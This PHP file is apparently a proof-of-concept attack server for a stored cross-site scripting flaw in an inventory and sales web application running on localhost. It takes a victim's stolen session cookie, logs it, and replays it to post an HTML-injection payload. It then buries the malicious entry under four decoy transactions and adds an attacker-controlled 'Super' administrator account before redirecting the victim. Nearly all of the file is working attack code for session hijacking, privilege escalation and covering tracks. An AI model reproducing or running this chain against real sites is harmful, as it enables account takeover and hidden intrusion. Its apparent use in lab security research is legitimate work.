        <?php


        //1. extracting of cookie
        $cookies = $_COOKIE["_1410__"];

        //2. logging of cookie
        $filename = "log.txt";
        $startstring = "";
        if (!is_file($filename)) {
            $startstring = " C2C Logging for Cookie extraction.\n Developed by Roland Reif. \n Usage only allowed and intended for legal purposes!\n\n";
        }
        $file = fopen($filename, 'a');
        fwrite($file, $startstring . date("Y-m-d-H:i:s.").gettimeofday()["usec"] . ": extracting Cookies ... \n");
        fwrite($file, date("Y-m-d-H:i:s.").gettimeofday()["usec"] .": Cookie extracted: " . $cookies . "\n\n");
        fwrite($file, date("Y-m-d-H:i:s.").gettimeofday()["usec"] . ": Starting initial Stealth attack ... \n");

        //3. first stealth attack: hide malicious link
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'http://localhost/mini-inventory-and-sales-management-system/transactions/nso_');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Host: localhost',
            'Content-Length: 249',
            'sec-ch-ua: "Chromium";v="111", "Not(A:Brand";v="8"',
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With: XMLHttpRequest',
            'sec-ch-ua-mobile: ?0',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36',
            'sec-ch-ua-platform: "Windows"',
            'Origin: http://localhost',
            'Sec-Fetch-Site: same-origin',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Dest: empty',
            'Referer: http://localhost/mini-inventory-and-sales-management-system/transactions',
            'Accept-Encoding: gzip, deflate',
            'Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection: close',
        ]);
        curl_setopt($ch, CURLOPT_COOKIE, '_1410__='.$cookies);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '_aoi=%5B%7B%22_iC%22%3A%2201%22%2C%22qty%22%3A1%2C%22unitPrice%22%3A15%2C%22totalPrice%22%3A15%7D%5D&_mop=POS&_at=15&_cd=0.00&_ca=15&vat=0&discount=0&cn=Tim+-+922+-+tim%40i.de&ce=%3C%2Ftd%3E%3Ctd%3ECompleted%3Cnoscript%3E&cp=%3C%2Ftd%3E%3Ctd%3EMar+2');
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        fwrite($file, date("Y-m-d-H:i:s.").gettimeofday()["usec"] . ": Curl HTTP Payload built. Going to execute ... \n");

        $response = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        fwrite($file, date("Y-m-d-H:i:s.").gettimeofday()["usec"] . ": Receveid Response with HTTP Code " . $httpcode . " \n");
        fwrite($file, date("Y-m-d-H:i:s.").gettimeofday()["usec"] . ": Full Response: " . $response . " \n");

        curl_close($ch);

        fwrite($file, date("Y-m-d-H:i:s.").gettimeofday()["usec"]. ": Connection closed... \n");
        fwrite($file, date("Y-m-d-H:i:s.").gettimeofday()["usec"]. ": Preparing second stealth attack with decoy transactions ... \n");

        //4. Second stealth attack: fill transactions with previous transactions
        class DecoyTA
        {
            //attributes
            public $name;
            public $phoneNumber;
            public $email;

            //constructor function
            function __construct($name, $phoneNumber, $email)
            {
                $this->name = $name;
                $this->phoneNumber = $phoneNumber;
                $this->email = $email;
            }
        }

        $decoys = array();
        $decoys[0 ] = new DecoyTA("Lisa+Meier","12309845672","lisa.meier%40gmail.com");
        $decoys[1 ] = new DecoyTA("Maxi+Taiga","97330984562","maxi.taiga%40gmail.com");
        $decoys[2 ] = new DecoyTA("Karl+Rauch","12098455672","karl.rauch%40gmail.com");
        $decoys[3 ] = new DecoyTA("Tina+Raida","00230984567","tina.raida%40gmail.com");

        foreach ($decoys as $decoy){

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'http://localhost/mini-inventory-and-sales-management-system/transactions/nso_');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Host: localhost',
            'Content-Length: 204',
            'sec-ch-ua: "Chromium";v="111", "Not(A:Brand";v="8"',
            'Accept: */',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With: XMLHttpRequest',
            'sec-ch-ua-mobile: ?0',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36',
            'sec-ch-ua-platform: "Windows"',
            'Origin: http://localhost',
            'Sec-Fetch-Site: same-origin',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Dest: empty',
            'Referer: http://localhost/mini-inventory-and-sales-management-system/transactions',
            'Accept-Encoding: gzip, deflate',
            'Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection: close',
        ]);
        curl_setopt($ch, CURLOPT_COOKIE, '_1410__=' . $cookies);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '_aoi=%5B%7B%22_iC%22%3A%2201%22%2C%22qty%22%3A1%2C%22unitPrice%22%3A15%2C%22totalPrice%22%3A15%7D%5D&_mop=POS&_at=15&_cd=0.00&_ca=15&vat=0&discount=0&cn='.$decoy->name.'&ce='.$decoy->email.'&cp='.$decoy->phoneNumber);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        fwrite($file, date("Y-m-d-H:i:s.").gettimeofday()["usec"] . ": Curl HTTP Payload built. Going to execute ... \n");

        $response = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        fwrite($file, date("Y-m-d-H:i:s.").gettimeofday()["usec"] . ": Receveid Response with HTTP Code " . $httpcode . " \n");
        fwrite($file, date("Y-m-d-H:i:s.").gettimeofday()["usec"] . ": Full Response: " . $response . " \n");

        curl_close($ch);

        fwrite($file, date("Y-m-d-H:i:s.").gettimeofday()["usec"] . ": Connection closed... \n");

        }

        //6. Privilege Escalation: add attacker as admin
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'http://localhost/mini-inventory-and-sales-management-system/administrators/add');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Host: localhost',
            'Content-Length: 147',
            'sec-ch-ua: "Chromium";v="111", "Not(A:Brand";v="8"',
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With: XMLHttpRequest',
            'sec-ch-ua-mobile: ?0',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36',
            'sec-ch-ua-platform: "Windows"',
            'Origin: http://localhost',
            'Sec-Fetch-Site: same-origin',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Dest: empty',
            'Referer: http://localhost/mini-inventory-and-sales-management-system/administrators',
            'Accept-Encoding: gzip, deflate',
            'Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection: close',
        ]);
        curl_setopt($ch, CURLOPT_COOKIE, '_1410__=' . $cookies);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'firstName=AttackerFN&lastName=AttackerLN&email=attacker%40web.de&role=Super&mobile1=13524069788&mobile2=&passwordOrig=attacker&passwordDup=attacker');
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        fwrite($file, date("Y-m-d-H:i:s.").gettimeofday()["usec"] . ": Curl HTTP Payload built. Going to execute ... \n");

        $response = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        fwrite($file, date("Y-m-d-H:i:s.").gettimeofday()["usec"] . ": Receveid Response with HTTP Code " . $httpcode . " \n");
        fwrite($file, date("Y-m-d-H:i:s.").gettimeofday()["usec"] . ": Full Response: " . $response . " \n");

        curl_close($ch);

        fwrite($file, date("Y-m-d-H:i:s.").gettimeofday()["usec"]. ": Connection closed... \n");

        fwrite($file, date("Y-m-d-H:i:s.").gettimeofday()["usec"]. ": Redirecting victim... \n");

        //7. Redirect Client back to webapplication. Now without the malicious link displayed but instead with legitimate transactions
        header('Location:http://localhost/mini-inventory-and-sales-management-system/transactions');
        ?>
